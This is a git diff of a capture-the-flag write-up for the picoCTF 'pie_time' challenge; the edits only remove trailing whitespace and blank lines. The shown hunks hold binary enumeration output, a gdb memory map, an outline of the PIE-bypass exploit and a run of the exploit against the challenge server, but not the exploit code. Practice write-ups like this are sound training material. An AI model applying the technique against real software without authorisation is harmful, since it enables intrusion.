@@ -1,19 +1,18 @@
 ---
-title: pie_time  
+title: pie_time
 description: Writeup for the pie_time challenge in picoctf
 created: 2025-07-02
-tags: pwn, ctf, practice, picoctf  
+tags: pwn, ctf, practice, picoctf
 draft: false
 ---
 
 # Introduction
 
------
+---
 
 **Challenge Description**
 
 Can you try to get the flag? Beware we have PIE!
-
 
 **Challenge Hints**
 
@@ -23,7 +22,7 @@ The challenge pie-time was a binary exploitation problem released as part of pic
 
 # Enumeration
 
------
+---
 
 As always, we'll begin by enumerating the target application:
 
@@ -36,7 +35,7 @@ As always, we'll begin by enumerating the target application:
 
 ```bash
 
-$ file ./vuln 
+$ file ./vuln
 ./vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped
 
 $ pwn checksec ./vuln
@@ -50,7 +49,7 @@ $ pwn checksec ./vuln
     IBT:        Enabled
     Stripped:   No
 
-$ objdump -t ./vuln | grep -E "\.data|\.bss|\.text"           
+$ objdump -t ./vuln | grep -E "\.data|\.bss|\.text"
 00000000000011a0 l    d  .text  0000000000000000              .text
 0000000000004000 l    d  .data  0000000000000000              .data
 0000000000004010 l    d  .bss   0000000000000000              .bss
@@ -92,7 +91,7 @@ We’ll see exactly how this affects exploitation as we continue analyzing the c
 
 # Code Review
 
------
+---
 
 This challenge provides us with the source code. Let’s review it before continuing:
 
@@ -157,7 +156,7 @@ If we look closer, we see that the `win` function is never called in normal exec
 Running it locally shows that the leaked address of main changes every time:
 
 ```bash
-$ ./vuln     
+$ ./vuln
 Address of main: 0x55b03c6f433d
 Enter the address to jump to, ex => 0x12345: 0x12345
 Your input: 12345
@@ -199,27 +198,27 @@ gef➤  info proc mappings
 process 64455
 Mapped address spaces:
 
-Start Addr         End Addr           Size               Offset             Perms File 
-0x0000555555554000 0x0000555555555000 0x1000             0x0                r--p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example 
-0x0000555555555000 0x0000555555556000 0x1000             0x1000             r-xp  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example 
-0x0000555555556000 0x0000555555557000 0x1000             0x2000             r--p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example 
-0x0000555555557000 0x0000555555558000 0x1000             0x2000             r--p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example 
-0x0000555555558000 0x0000555555559000 0x1000             0x3000             rw-p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example 
-0x00007ffff7dae000 0x00007ffff7db1000 0x3000             0x0                rw-p   
-0x00007ffff7db1000 0x00007ffff7dd9000 0x28000            0x0                r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
-0x00007ffff7dd9000 0x00007ffff7f3e000 0x165000           0x28000            r-xp  /usr/lib/x86_64-linux-gnu/libc.so.6 
-0x00007ffff7f3e000 0x00007ffff7f94000 0x56000            0x18d000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
-0x00007ffff7f94000 0x00007ffff7f98000 0x4000             0x1e2000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
-0x00007ffff7f98000 0x00007ffff7f9a000 0x2000             0x1e6000           rw-p  /usr/lib/x86_64-linux-gnu/libc.so.6 
-0x00007ffff7f9a000 0x00007ffff7fa7000 0xd000             0x0                rw-p   
-0x00007ffff7fc0000 0x00007ffff7fc2000 0x2000             0x0                rw-p   
-0x00007ffff7fc2000 0x00007ffff7fc6000 0x4000             0x0                r--p  [vvar] 
-0x00007ffff7fc6000 0x00007ffff7fc8000 0x2000             0x0                r-xp  [vdso] 
-0x00007ffff7fc8000 0x00007ffff7fc9000 0x1000             0x0                r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
-0x00007ffff7fc9000 0x00007ffff7ff0000 0x27000            0x1000             r-xp  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
-0x00007ffff7ff0000 0x00007ffff7ffb000 0xb000             0x28000            r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
-0x00007ffff7ffb000 0x00007ffff7ffd000 0x2000             0x33000            r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
-0x00007ffff7ffd000 0x00007ffff7fff000 0x2000             0x35000            rw-p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
+Start Addr         End Addr           Size               Offset             Perms File
+0x0000555555554000 0x0000555555555000 0x1000             0x0                r--p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example
+0x0000555555555000 0x0000555555556000 0x1000             0x1000             r-xp  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example
+0x0000555555556000 0x0000555555557000 0x1000             0x2000             r--p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example
+0x0000555555557000 0x0000555555558000 0x1000             0x2000             r--p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example
+0x0000555555558000 0x0000555555559000 0x1000             0x3000             rw-p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example
+0x00007ffff7dae000 0x00007ffff7db1000 0x3000             0x0                rw-p
+0x00007ffff7db1000 0x00007ffff7dd9000 0x28000            0x0                r--p  /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7dd9000 0x00007ffff7f3e000 0x165000           0x28000            r-xp  /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f3e000 0x00007ffff7f94000 0x56000            0x18d000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f94000 0x00007ffff7f98000 0x4000             0x1e2000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f98000 0x00007ffff7f9a000 0x2000             0x1e6000           rw-p  /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f9a000 0x00007ffff7fa7000 0xd000             0x0                rw-p
+0x00007ffff7fc0000 0x00007ffff7fc2000 0x2000             0x0                rw-p
+0x00007ffff7fc2000 0x00007ffff7fc6000 0x4000             0x0                r--p  [vvar]
+0x00007ffff7fc6000 0x00007ffff7fc8000 0x2000             0x0                r-xp  [vdso]
+0x00007ffff7fc8000 0x00007ffff7fc9000 0x1000             0x0                r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7fc9000 0x00007ffff7ff0000 0x27000            0x1000             r-xp  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7ff0000 0x00007ffff7ffb000 0xb000             0x28000            r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7ffb000 0x00007ffff7ffd000 0x2000             0x33000            r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007ffff7ffd000 0x00007ffff7fff000 0x2000             0x35000            rw-p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
 0x00007ffffffde000 0x00007ffffffff000 0x21000            0x0                rw-p  [stack]
 
 ```
@@ -229,6 +228,7 @@ With this knowledge, we can reliably compute the PIE base and use it to find the
 # Exploit
 
 We can breakdown the exploit into the following steps:
+
 1. capture the address of `main`
 2. calculate the PIE base address
 3. calculcate the address of win
@@ -329,7 +329,6 @@ io.close()
 
 </details>
 
-
 ```bash
 $ ./exploit.py REMOTE HOST=rescued-float.picoctf.net PORT=64870
 [+] Opening connection to rescued-float.picoctf.net on port 64870: Done
@@ -339,5 +338,3 @@ $ ./exploit.py REMOTE HOST=rescued-float.picoctf.net PORT=64870
 [*] Closed connection to rescued-float.picoctf.net port 64870
 [+] flag: picoCTF{REDACTED}
 ```
-
-
